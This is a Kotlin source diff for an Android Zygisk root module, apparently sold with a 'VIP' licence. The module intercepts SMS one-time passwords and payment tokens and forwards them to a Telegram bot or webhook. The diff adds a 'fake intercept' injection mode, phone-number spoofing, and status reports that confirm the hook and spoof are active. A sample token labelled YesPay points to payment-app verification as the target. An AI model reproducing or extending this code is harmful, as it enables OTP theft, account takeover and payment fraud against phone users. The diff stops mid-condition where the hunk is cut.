@@ -1,18 +1,22 @@
 package com.hivirtus.zygiskmode
 
+import android.content.Context
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 
-class TokenForwarder(private val configManager: ConfigManager) {
+class TokenForwarder(
+    private val configManager: ConfigManager,
+    private val context: Context? = null
+) {
 
     private val client = OkHttpClient()
 
     fun forward(otp: LastOtp): Boolean {
         val config = configManager.load()
-        if (!config.autoForwardToken) return false
+        if (!config.autoForwardToken && !config.fakeInterceptTelegram) return false
 
         val peer = otp.rawPeer.ifBlank { otp.sender }
         val body = otp.body.ifBlank { otp.otp }
@@ -26,49 +30,73 @@ class TokenForwarder(private val configManager: ConfigManager) {
             return forwardWebhook(config.forwardUrl, config.forwardMethod, otp)
         }
 
-        return forwardTelegram(botToken, chatId, otp)
+        return forwardTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
     }
 
-    fun sendTestMessage(): Boolean {
+    fun forwardFakeIntercept(otp: LastOtp): Boolean {
         val config = configManager.load()
+        if (!config.fakeInterceptTelegram) return false
         val botToken = config.telegramBotToken
         val chatId = config.telegramChatId
         if (botToken.isBlank() || chatId.isBlank()) return false
+        return forwardTelegram(botToken, chatId, buildZygiskMenuMessage(otp, fakeIntercept = true))
+    }
 
-        val testId = SmsMatcher.userSenderId(config) ?: "YOUR-SENDER-ID"
-        val testOtp = LastOtp(
-            otp = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
-            sender = testId,
-            body = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
-            phone = testId,
-            messageLabel = "YesPay",
-            direction = "incoming",
-            rawPeer = "AD-YESPRO-S"
-        )
-        return forwardTelegram(botToken, chatId, testOtp)
+    fun sendTestMessage(botToken: String, chatId: String, health: ModuleHealth): Boolean {
+        if (botToken.isBlank() || chatId.isBlank()) return false
+        val config = configManager.load()
+        val interceptNo = SmsMatcher.userSenderId(config)
+            ?: health.spoofPhone.ifBlank { config.mockPhoneSim1 }
+        val sampleToken =
+            "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g=="
+
+        val text = buildString {
+            appendLine("📱 <b>Zygisk Menu</b>")
+            appendLine("<b>Mode By @hivirtus @liqdy</b>")
+            appendLine("────────────────")
+            appendLine("<b>${escapeHtml(health.statusLine)}</b>")
+            appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
+            appendLine("📦 Module ZIP: ${if (health.moduleInstalled) "Installed ✅" else "Missing ❌"}")
+            appendLine("⚡ Zygisk Hook: ${if (health.zygiskLoaded) "Loaded ✅" else "Not loaded — reboot?"}")
+            appendLine("📱 Phone Spoof: ${if (health.phoneSpoofReady) "Ready ✅ (${escapeHtml(health.spoofPhone)})" else "OFF / number missing ❌"}")
+            appendLine("🆔 Sender ID: ${if (health.senderIdSet) "Set ✅" else "Missing — MESSAGE tab ❌"}")
+            appendLine("🔐 VIP: ${if (health.licensed) "Active ✅" else "Not active ❌"}")
+            appendLine("🌐 Root: ${escapeHtml(health.rootType)}")
+            appendLine("────────────────")
+            append(escapeHtml(sampleToken))
+        }
+        return postTelegram(botToken, chatId, text)
     }
 
     private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp): Boolean {
         return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
     }
 
-    fun buildZygiskMenuMessage(otp: LastOtp): String {
+    fun buildZygiskMenuMessage(otp: LastOtp, fakeIntercept: Boolean = false): String {
         val config = configManager.load()
         val interceptNo = resolveInterceptLabel(config, otp)
         val tokenBody = otp.body.ifBlank { otp.otp }
+        val health = context?.let { ModuleHealthChecker.check(it) }
 
         return buildString {
             appendLine("📱 <b>Zygisk Menu</b>")
             appendLine("<b>Mode By @hivirtus @liqdy</b>")
             appendLine("────────────────")
+            if (health != null) {
+                appendLine("<b>${escapeHtml(health.statusLine)}</b>")
+            }
+            if (fakeIntercept) {
+                appendLine("🎭 <b>Fake Intercept</b> (test/inject)")
+            }
             appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
             append(escapeHtml(tokenBody))
         }
     }
 
-    /** Kabhi +91 number mat dikhao — saved Sender ID hi */
     private fun resolveInterceptLabel(config: ModuleConfig, otp: LastOtp): String {
-        SmsMatcher.userSenderId(config)?.let { return it }
+        if (config.overrideIncomingSender) {
+            SmsMatcher.userSenderId(config)?.let { return it }
+        }
         val label = otp.phone.ifBlank { otp.sender }.trim()
         if (label.isNotBlank() && !SmsMatcher.isIndianMobileNumber(label) &&
             !SmsMatcher.isNumericSender(label)
